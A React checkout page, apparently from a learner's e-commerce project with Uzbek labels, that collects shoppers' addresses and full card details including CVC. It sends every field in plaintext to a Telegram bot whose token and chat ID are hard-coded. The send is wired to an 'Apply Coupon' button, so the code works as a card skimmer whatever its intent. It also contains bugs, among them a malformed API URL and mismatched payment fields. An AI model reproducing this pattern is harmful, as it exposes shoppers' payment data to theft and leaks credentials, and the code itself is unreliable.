import React, { useContext, useState } from 'react'
import { Await, Link } from 'react-router-dom'
import { CardContextCart } from '../context/CardContext'
import axios from 'axios'

const Order = () => {

    const { cart, minus, plus } = useContext(CardContextCart)
    const [firstName, setFirstName] = useState("");
    const [lastName, setLastName] = useState("");
    const [company, setCompany] = useState("");
    const [address, setAddress] = useState("");
    const [country, setCountry] = useState("");
    const [region, setRegion] = useState("");
    const [viloyat, setViloyat] = useState("");
    const [postalCode, setPostalCode] = useState("");
    const [email, setEmail] = useState("");
    const [phone, setPhone] = useState("");
    const [cash, setCash] = useState("");
    const [venmo, setVenmo] = useState("");
    const [paypal, setPaypal] = useState("");
    const [amazon, setAmazon] = useState("");
    const [debit, setDebit] = useState("");
    const [nameOnCard, setNameOnCard] = useState("");
    const [cardNumber, setCardNumber] = useState("");
    const [expirationDate, setExpirationDate] = useState("");
    const [cvc, setCVC] = useState("");
    const [orderNotes, setOrderNotes] = useState("");



    const payload = {
        firstName: firstName,
        lastName: lastName,
        company: company,
        address: address,
        country: country,
        region: region,
        viloyat: viloyat,
        postalCode: postalCode,
        email: email,
        phone: phone,
        cash: cash,
        venmo: venmo,
        paypal: paypal,
        amazon: amazon,
        debit: debit,
        nameOnCard: nameOnCard,
        cardNumber: cardNumber,
        expirationDate: expirationDate,
        cvc: cvc,
        orderNotes: orderNotes
    };



console.log(payload);

let message = "";
message+="Sizga buyurtma keldi!!!\n"
    message += `${payload.firstName}dan\n`;
    message += `${payload.lastName}\n`;
    message += `${payload.company}\n`;
    message += `${payload.address}\n`;
    message += `${payload.country}\n`;
    message += `${payload.region}\n`;
    message += `${payload.viloyat}\n`;
    message += `${payload.postalCode}\n`;
    message += `${payload.email}\n`;
    message += `${payload.phone}\n`;
    message += `${payload.cash}\n`;
    message += `${payload.venmo}\n`;
    message += `${payload.paypal}\n`;
    message += `${payload.amazon}\n`;
    message += `${payload.debit}\n`;
    message += `${payload.nameOnCard}\n`;
    message += `${payload.cardNumber}\n`;
    message += `${payload.expirationDate}\n`;
    message += `${payload.cvc}\n`;
    message += `${payload.orderNotes}\n`;



   async  function senTelegram (){
try{
    await fetch(`https:api.telegram.org/bot${CHat_TOKEN}/sendMessage` , {
        method:"POST",
        headers:{
            "Content-Type" :"application/json" ,

        },
        body:JSON.stringify({
            chat_id:ChAT_ID,
            text:message,
            parse_mode:"Markdown"
        }),

    })
}catch(err){
    console.log(err);
    
}
    }

    const ChAT_ID = `7746206586`
    const CHat_TOKEN = `7305669944:AAGNhD9sp3R3upiGtYXBG1NEY3781r8yrwo`;


    return (
        <>
            <section className="bg-gray-100 p-10">
                <div className="container mx-auto flex  gap-8">

                    <div className="bg-gray-100 min-h-screen py-10">
                        <div className="max-w-5xl mx-auto bg-white p-8 rounded-md">

                            <h2 className="text-xl font-semibold mb-6">Billing Information</h2>


                            <div className="grid  grid-cols-1 md:grid-cols-3 gap-4 mb-4">
                                <input onChange={(e) => setFirstName(e.target.value)} className="border border-2 border-[black]/40 p-3 rounded" placeholder="First name" />
                                <input onChange={(e) => setLastName(e.target.value)} className="border border-2 border-[black]/40 p-3 rounded" placeholder="Last name" />
                                <input onChange={(e) => setCompany(e.target.value)} className="border border-2 border-[black]/40 p-3 rounded" placeholder="Company Name (Optional)" />
                            </div>


                            <input
                               
                                onChange={(e) => setAddress(e.target.value)}
                                className="border p-3 rounded w-full mb-4 border-2 border-[black]/40"
                                placeholder="Address"
                            />


                            <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-4">

                                <select onChange={(e) => setCountry(e.target.value)} className="border  border-2 border-[black]/40 p-3 rounded ">
                                    <option value="O'zbekiston">O'zbekiston</option>
                                    <option value="Yaponiya">Yaponiya</option>
                                    <option value="Qirg'iziston">Qirg'iziston</option>
                                </select>
                                <select onChange={(e) => setRegion(e.target.value)} className="border border-2 border-[black]/40 p-3 rounded">
                                    <option value="Uzbekistan">Uzbekistan</option>
                                    <option value="UnitedStates">United States</option>
                                    <option value="Japan">Japan</option>
                                </select>
                                <select onChange={(e) => setViloyat(e.target.value)} className="border border-2 border-[black]/40 p-3 rounded">
                                    <option value="Toshkent">Toshkent</option>
                                    <option value="Samarqand">Samarqand</option>
                                    <option value="Buxoro">Buxoro</option>
                                    <option value="Andijon">Andijon</option>
                                    <option value="Farg‘ona">Farg‘ona</option>
                                    <option value="Namangan">Namangan</option>
                                    <option value="Qashqadaryo">Qashqadaryo</option>
                                    <option value="Surxondaryo">Surxondaryo</option>
                                    <option value="Xorazm">Xorazm</option>
                                    <option value="Navoiy">Navoiy</option>
                                    <option value="Jizzax">Jizzax</option>
                                    <option value="Sirdaryo">Sirdaryo</option>
                                </select>
                                <input onChange={(e) => setPostalCode(e.target.value)} className="border border-2 border-[black]/40 p-3 rounded" placeholder="Zip Code" />
                            </div>


                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                                <input onChange={(e) => setEmail(e.target.value)} className="border border-2 border-[black]/40 p-3 rounded" placeholder="Email" />
                                <input onChange={(e) => setPhone(e.target.value)}
                                    className="border border-2 border-[black]/40 p-3 rounded" placeholder="Phone Number" />
                            </div>


                            <label className="flex items-center gap-2 mb-6 text-sm">
                                <input onChange={(e) => setVenmo(e.target.value)} type="checkbox" className="accent-orange-500" />
                                Ship into different address
                            </label>


                            <h3 className="text-lg font-semibold mb-4">Payment Option</h3>

                            <div className="grid grid-cols-2 md:grid-cols-5 gap-4 mb-6 text-sm">
                                <label className="border border-2 border-[black]/40 rounded p-3 flex items-center gap-2">
                                    <input onChange={(e) => setCash(e.target.value)} type="radio" name="pay" />
                                    Cash on Delivery
                                </label>

                                <label className="border border-2 border-[black]/40 rounded p-3 flex items-center gap-2">
                                    <input onChange={(e) => setCash(e.target.value)} type="radio" name="pay" />
                                    Venmo
                                </label>

                                <label className="border border-2 border-[black]/40 rounded p-3 flex items-center gap-2">
                                    <input onChange={(e) => setPaypal(e.target.value)} type="radio" name="pay" />
                                    Paypal
                                </label>

                                <label className="border border-2 border-[black]/40 rounded p-3 flex items-center gap-2">
                                    <input onChange={(e) => setAmazon(e.target.value)} type="radio" name="pay" />
                                    Amazon Pay
                                </label>

                                <label className="border border-2 border-[black]/40 rounded p-3 flex items-center gap-2 ">
                                    <input onChange={(e) => setDebit(e.target.value)} type="radio" name="pay" defaultChecked />
                                    Debit/Credit Card
                                </label>
                            </div>


                            <input
                                onChange={(e) => setNameOnCard(e.target.value)}
                                className="border border-2 border-[black]/40 p-3 rounded w-full mb-4"
                                placeholder="Name on Card"
                            />

                            <input
                                onChange={(e) => setCardNumber(e.target.value)}
                                className="border border-2 border-[black]/40 p-3 rounded w-full mb-4"
                                placeholder="Card Number"
                            />

                            <div className="grid grid-cols-2 gap-4 mb-6">
                                <input onChange={(e) => setExpirationDate(e.target.value)} className="border border-2 border-[black]/40 p-3 rounded" placeholder="DD/YY" />
                                <input onChange={(e) => setCVC(e.target.value)}
 className="border border-2 border-[black]/40 p-3 rounded" placeholder="CVC" />
                            </div>


                            <h3 className="text-lg font-semibold mb-3">Additional Information</h3>

                            <textarea
                                onChange={(e) => setOrderNotes(e.target.value)}
                                className="border border-2 border-[black]/40 p-3 rounded w-full h-28 resize-none"
                                placeholder="Order Notes (Optional)"
                            />

                        </div>
                    </div>







                    <div className="w-full lg:w-1/2 flex flex-col items-center gap-5">
                        {/* Shopping Cart */}
                        <div className="w-full bg-white p-6 rounded shadow">
                            <h2 className="text-xl font-semibold mb-4">Shopping Cart</h2>

                            <div className="grid grid-cols-5 text-sm text-gray-500 border-b pb-2 border-gray-300">
                                <div className="col-span-2">Products</div>
                                <div>Price</div>
                                <div>Quantity</div>
                                <div>Sub-total</div>
                            </div>

                            <div>
                                {cart.map((el) => (
                                    <div key={el.id} className="grid grid-cols-5 items-center py-4 border-b border-gray-300">
                                        <div className="col-span-2 flex items-center gap-4">
                                            <img className="w-20 rounded" src={el.thumbnail} alt={el.title} />
                                            <p className="text-sm font-medium">{el.title}</p>
                                        </div>
                                        <div className="text-gray-500 line-through">${el.price}</div>
                                        <div className="flex items-center border border-gray-300 rounded-md overflow-hidden w-[110px] h-[36px]">
                                            <button
                                                onClick={() => minus(el)}
                                                className="w-8 h-full flex items-center justify-center text-gray-500 hover:bg-gray-100"
                                            >
                                                −
                                            </button>
                                            <span className="flex-1 text-center text-sm font-medium text-gray-700">{el.qty}</span>
                                            <button
                                                onClick={() => plus(el)}
                                                className="w-8 h-full flex items-center justify-center text-gray-500 hover:bg-gray-100"
                                            >
                                                +
                                            </button>
                                        </div>
                                        <div className="font-semibold">${(el.price * el.qty).toFixed(2)}</div>
                                    </div>
                                ))}
                            </div>

                            <div className="flex justify-between mt-6">
                                <button className="border px-6 py-2 text-blue-500 flex items-center gap-2">
                                    ← Return to Shop
                                </button>
                                <button className="border px-6 py-2 text-blue-500">Update Cart</button>
                            </div>
                        </div>

                        {/* Cart Totals */}
                        <div className="space-y-8 w-full">
                            <div className="bg-white p-6 rounded shadow">
                                <h3 className="font-semibold mb-4">Cart Totals</h3>
                                <div className="space-y-2 text-sm">
                                    <div className="flex justify-between">
                                        <span>Sub-total</span>
                                        <span>
                                            ${cart.reduce((sum, el) => sum + (el.price - (el.price * el.discountPercentage) / 100) * el.qty, 0).toFixed(2)}
                                        </span>
                                    </div>
                                    <div className="flex justify-between">
                                        <span>Shipping</span>
                                        <span className="text-green-500">Free</span>
                                    </div>
                                    <div className="flex justify-between">
                                        <span>Discount</span>
                                        <span>
                                            ${cart.reduce((sum, el) => sum + (el.price * el.discountPercentage) / 100 * el.qty, 0).toFixed(2)}
                                        </span>
                                    </div>
                                    <div className="flex justify-between">
                                        <span>Tax</span>
                                        <span>$61.99</span>
                                    </div>
                                </div>

                                <div className="flex justify-between font-semibold border-t mt-4 pt-4">
                                    <span>Total</span>
                                    <span>${cart.reduce((sum, el) => sum + el.price * el.qty, 0).toFixed(2)}</span>
                                </div>

                                <button className="w-full mt-6 bg-orange-500 text-white py-3 rounded hover:bg-orange-600">
                                    PROCEED TO CHECKOUT →
                                </button>
                            </div>

                            {/* Coupon Code */}
                            <div className="bg-white p-6 rounded shadow">
                                <h3 className="font-semibold mb-4">Coupon Code</h3>
                                <input
                                    type="text"
                                    placeholder="Enter coupon code"
                                    className="w-full border px-3 py-2 mb-4 rounded"
                                />
                                <button  onClick={senTelegram}   className="w-full bg-blue-500 text-white py-2 rounded hover:bg-blue-600">
                                    APPLY COUPON
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

        </>
    )
}

export default Order